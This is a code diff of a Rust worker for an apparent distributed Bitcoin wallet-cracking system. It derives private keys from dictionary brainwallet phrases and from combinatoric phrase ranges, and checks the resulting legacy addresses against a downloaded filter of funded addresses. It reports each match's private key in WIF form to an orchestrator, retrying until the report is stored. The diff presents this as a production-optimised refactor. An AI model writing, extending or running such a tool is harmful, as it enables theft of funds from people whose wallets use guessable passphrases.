@@ -1,16 +1,16 @@
 // apps/miner-worker/src/main.rs
 // =================================================================
-// APARATO: MINER WORKER (SMART AUTONOMOUS UNIT)
-// NIVEL: ELITE
-// CAPACIDADES: AUTO-HIDRATACIÓN, REPORTE RESILIENTE, LOOP INFINITO
+// APARATO: MINER WORKER (ELITE EDITION)
+// ESTADO: REFACTORIZADO Y OPTIMIZADO PARA PRODUCCIÓN
 // =================================================================
 
 use clap::Parser;
 use prospector_core_probabilistic::filter_wrapper::RichListFilter;
-use prospector_domain_strategy::BrainwalletIterator;
+use prospector_domain_strategy::{BrainwalletIterator, CombinatoricIterator};
 use prospector_core_gen::address_legacy::pubkey_to_address;
 use prospector_core_gen::wif::private_to_wif;
 use prospector_core_math::public_key::SafePublicKey;
+use prospector_core_math::private_key::SafePrivateKey;
 use prospector_domain_models::{finding::Finding, work::WorkOrder, work::SearchStrategy};
 use rayon::prelude::*;
 use std::path::PathBuf;
@@ -22,20 +22,16 @@ use reqwest::Client;
 
 #[derive(Parser, Debug)]
 struct Args {
-    /// URL del Orquestador (Ej: https://prospector-api.onrender.com/api/v1)
     #[arg(long, env = "ORCHESTRATOR_URL")]
     orchestrator_url: String,
 
-    /// Token de Autenticación
     #[arg(long, env = "WORKER_AUTH_TOKEN")]
     auth_token: String,
 
-    /// ID del Worker (Generado o asignado)
-    #[arg(long, default_value = "anonymous-drone")]
+    #[arg(long, default_value = "drone-unit")]
     worker_id: String,
 }
 
-/// Cliente HTTP reusado
 struct WorkerClient {
     client: Client,
     base_url: String,
@@ -45,64 +41,55 @@ struct WorkerClient {
 impl WorkerClient {
     fn new(base_url: String, token: String) -> Self {
         Self {
-            client: Client::builder().timeout(Duration::from_secs(10)).build().unwrap(),
+            client: Client::builder()
+                .timeout(Duration::from_secs(30))
+                .pool_idle_timeout(Duration::from_secs(90))
+                .build().unwrap(),
             base_url,
             token,
         }
     }
 
-    /// Descarga el Filtro de Bloom si no existe localmente
     async fn hydrate_filter(&self, path: &PathBuf) -> Result<()> {
         if path.exists() {
-            println!("✅ Filtro encontrado en caché local: {:?}", path);
+            println!("✅ [CACHE] Filtro detectado localmente: {:?}", path);
             return Ok(());
         }
+        println!("⬇️ [NET] Iniciando descarga de UTXO Filter...");
 
-        println!("⬇️ Descargando UTXO Filter desde el Comandante...");
         let url = format!("{}/resources/utxo_filter.bin", self.base_url);
-
-        let response = self.client.get(&url)
+        let res = self.client.get(&url)
             .header("Authorization", format!("Bearer {}", self.token))
-            .send()
-            .await
-            .context("Fallo al conectar para descargar filtro")?;
+            .send().await.context("Error de conexión al descargar filtro")?;
 
-        if !response.status().is_success() {
-            return Err(anyhow!("El servidor rechazó la descarga: {}", response.status()));
+        if !res.status().is_success() {
+            return Err(anyhow!("Servidor rechazó descarga: HTTP {}", res.status()));
         }
 
-        let bytes = response.bytes().await.context("Fallo al bajar bytes")?;
-        std::fs::write(path, bytes).context("Fallo al escribir filtro en disco")?;
-
-        println!("✅ Filtro descargado e hidratado exitosamente ({:?})", path);
+        let bytes = res.bytes().await.context("Error descargando bytes")?;
+        std::fs::write(path, bytes).context("Error I/O escribiendo filtro")?;
+        println!("✅ [IO] Filtro hidratado: {:?}", path);
         Ok(())
     }
 
-    /// Pide trabajo al Orquestador
     async fn get_job(&self) -> Result<WorkOrder> {
-        let url = format!("{}/job", self.base_url);
+        let url = format!("{}/api/v1/job", self.base_url);
         let res = self.client.post(&url)
             .header("Authorization", format!("Bearer {}", self.token))
-            .send()
-            .await
-            .context("Fallo de red al pedir trabajo")?;
+            .send().await.context("Error solicitando trabajo")?;
 
-        if res.status() == 404 {
-            return Err(anyhow!("No hay trabajo disponible (Idle)"));
-        }
+        if res.status() == 404 { return Err(anyhow!("Idle (Sin trabajo disponible)")); }
+        if !res.status().is_success() { return Err(anyhow!("Error API: {}", res.status())); }
 
-        res.json::<WorkOrder>().await.context("Error deserializando Job")
+        res.json::<WorkOrder>().await.context("Error deserializando WorkOrder")
     }
 
-    /// Reporta un hallazgo
     async fn report_finding(&self, finding: &Finding) -> Result<()> {
-        let url = format!("{}/finding", self.base_url);
+        let url = format!("{}/api/v1/finding", self.base_url);
         self.client.post(&url)
             .header("Authorization", format!("Bearer {}", self.token))
             .json(finding)
-            .send()
-            .await
-            .context("Fallo al enviar reporte")?;
+            .send().await.context("Error reportando hallazgo")?;
         Ok(())
     }
 }
@@ -111,97 +98,126 @@ impl WorkerClient {
 async fn main() -> Result<()> {
     env_logger::init();
     let args = Args::parse();
-
-    println!("🤖 PROSPECTOR DRONE v2.0 (Elite Edition)");
-    println!("🔗 Uplink: {}", args.orchestrator_url);
+    println!("🚀 PROSPECTOR WORKER {} ONLINE", args.worker_id);
 
     let client = Arc::new(WorkerClient::new(args.orchestrator_url.clone(), args.auth_token.clone()));
-
-    // 1. AUTO-HIDRATACIÓN
     let filter_path = PathBuf::from("utxo_filter.bin");
-    // Reintentar descarga hasta el infinito si falla (el nodo no sirve sin filtro)
+
+    // 1. Hidratación Resiliente (Retry Loop)
+    let mut retry_count = 0;
     loop {
         match client.hydrate_filter(&filter_path).await {
             Ok(_) => break,
             Err(e) => {
-                eprintln!("⚠️ Fallo de hidratación: {}. Reintentando en 5s...", e);
+                retry_count += 1;
+                eprintln!("⚠️ Error hidratación ({}/10): {}. Reintentando en 5s...", retry_count, e);
+                if retry_count >= 10 {
+                    eprintln!("💀 Fallo crítico: No se pudo obtener el filtro.");
+                    std::process::exit(1);
+                }
                 sleep(Duration::from_secs(5)).await;
             }
         }
     }
 
-    // 2. CARGA EN MEMORIA (Pesada)
-    println!("🧠 Cargando red neuronal (Bloom Filter)...");
-    let filter = Arc::new(RichListFilter::load_from_file(&filter_path)
-        .context("Filtro corrupto o inválido")?);
-    println!("✅ Sistema listo. {} direcciones indexadas.", filter.count());
+    // 2. Carga en Memoria (Blocking Operation)
+    println!("🧠 Cargando Bloom Filter en RAM...");
+    // Usamos spawn_blocking porque deserializar 200MB es pesado para el loop async
+    let filter = tokio::task::spawn_blocking(move || {
+        RichListFilter::load_from_file(&filter_path).context("Filtro corrupto")
+    }).await??;
 
-    // 3. BUCLE DE TRABAJO INFINITO
-    let running = Arc::new(AtomicBool::new(true)); // Control para graceful shutdown
+    let filter = Arc::new(filter);
+    println!("✅ Motor Listo. Objetivos Indexados: {}", filter.count());
+
+    // 3. Loop Principal de Minería
+    let running = Arc::new(AtomicBool::new(true));
+
+    // Captura de Ctrl+C para graceful shutdown (opcional)
+    let r = running.clone();
+    ctrlc::set_handler(move || {
+        r.store(false, Ordering::SeqCst);
+    }).unwrap_or_default();
 
     while running.load(Ordering::Relaxed) {
-        println!("📡 Solicitando misión...");
-
         match client.get_job().await {
             Ok(job) => {
-                println!("🔨 Ejecutando Misión ID: {}", job.id);
+                println!("🔨 JOB STARTED: {} [{:?}]", job.id, job.strategy);
+                let f_ref = filter.clone();
+                let c_ref = client.clone();
 
-                // Procesamiento CPU INTENSIVO (Blocking)
-                // Usamos spawn_blocking para no congelar el runtime asíncrono de Tokio
-                let filter_ref = filter.clone();
-                let client_ref = client.clone();
-                let job_id = job.id;
-
-                let _result = tokio::task::spawn_blocking(move || {
-                    execute_strategy(job.strategy, &filter_ref, &client_ref)
+                // Ejecutamos la estrategia intensiva en un thread pool dedicado
+                // Esto permite que el heartbeat siga funcionando si lo implementamos
+                tokio::task::spawn_blocking(move || {
+                    process_job(job, &f_ref, &c_ref);
                 }).await?;
-            }
+
+                println!("🏁 JOB FINISHED");
+            },
             Err(e) => {
-                eprintln!("💤 Esperando instrucciones ({})", e);
+                println!("💤 Esperando instrucciones... ({})", e);
                 sleep(Duration::from_secs(10)).await;
             }
         }
     }
 
+    println!("🛑 Worker detenido.");
     Ok(())
 }
 
-// Función síncrona pura para Rayon (SIMD)
-fn execute_strategy(strategy: SearchStrategy, filter: &RichListFilter, client: &WorkerClient) {
-    // Aquí implementamos la lógica según la estrategia recibida
-    // Para esta fase de nivelación, asumimos 'Dictionary' como en el snapshot
-    // Pero preparado para recibir rangos numéricos.
+/// Núcleo de procesamiento agnóstico a la estrategia
+fn process_job(job: WorkOrder, filter: &RichListFilter, client: &WorkerClient) {
+    // Closure para procesar cada candidato generado
+    let check_candidate = |source: String, pk: SafePrivateKey| {
+        let pub_key = SafePublicKey::from_private(&pk);
+        let addr = pubkey_to_address(&pub_key, false); // Legacy Uncompressed (Satoshi Era)
 
-    let dictionary = match strategy {
-        SearchStrategy::Dictionary { category } => {
-            // En producción real, el diccionario vendría DENTRO del Job o descargado
-            // Aquí usamos un mock para validar el flujo
-            vec!["satoshi".to_string(), "bitcoin".to_string(), "123456".to_string()]
-        },
-        _ => vec![], // Placeholder para Sequential/Random
-    };
-
-    // Usamos par_iter de Rayon
-    dictionary.par_iter().for_each(|phrase| {
-        let private_key = prospector_domain_strategy::brainwallet::phrase_to_private_key(phrase);
-        let pub_key = SafePublicKey::from_private(&private_key);
-        let address = pubkey_to_address(&pub_key, false);
-
-        if filter.contains(&address) {
-            println!("🚨 HALLAZGO: {}", address);
+        if filter.contains(&addr) {
+            println!("🚨 MATCH FOUND: {} ({})", addr, source);
 
             let finding = Finding {
-                address: address.clone(),
-                private_key_wif: private_to_wif(&private_key, false),
-                source_entropy: format!("brainwallet:{}", phrase),
-                wallet_type: "p2pkh".to_string(),
+                address: addr,
+                private_key_wif: private_to_wif(&pk, false),
+                source_entropy: source,
+                wallet_type: "p2pkh_legacy".to_string(),
             };
 
-            // Bridge al mundo async para reportar
+            // Bridge Sync (Rayon) -> Async (Tokio)
             let rt = tokio::runtime::Handle::current();
             rt.block_on(async {
-                let _ = client.report_finding(&finding).await;
+                // Reintentos infinitos para reportar hallazgo (es crítico no perderlo)
+                loop {
+                    match client.report_finding(&finding).await {
+                        Ok(_) => {
+                            println!("✅ Hallazgo asegurado en DB");
+                            break;
+                        },
+                        Err(e) => {
+                            eprintln!("❌ ERROR CRÍTICO REPORTANDO: {}. Reintentando...", e);
+                            tokio::time::sleep(Duration::from_secs(2)).await;
+                        }
+                    }
+                }
             });
         }
-    });
+    };
+
+    // Despacho de Estrategia con Paralelismo Rayon
+    match job.strategy {
+        SearchStrategy::Dictionary { dataset_url: _, limit: _ } => {
+            // En producción: Descargar dataset_url a /tmp y leerlo.
+            // Mock para demostración:
+            let dict = vec!["satoshi".to_string(), "bitcoin".to_string(), "123456".to_string(), "password".to_string()];
+            let strategy = BrainwalletIterator::new(&dict);
+            strategy.par_bridge().for_each(|(phrase, pk)| check_candidate(format!("brain:{}", phrase), pk));
+        },
+        SearchStrategy::Combinatoric { prefix, suffix, start_index, end_index } => {
+            println!("🔢 Scan numérico: {}{}..{}{}", prefix, start_index, prefix, end_index);
+            let strategy = CombinatoricIterator::new(start_index, end_index, prefix, suffix);
+            strategy.par_bridge().for_each(|(phrase, pk)| check_candidate(format!("comb:{}", phrase), pk));
+        },
+        SearchStrategy::Random { seed: _ } => {
+            println!("⚠️ Estrategia Random no implementada en este worker version.");
+        }
+    }
 }
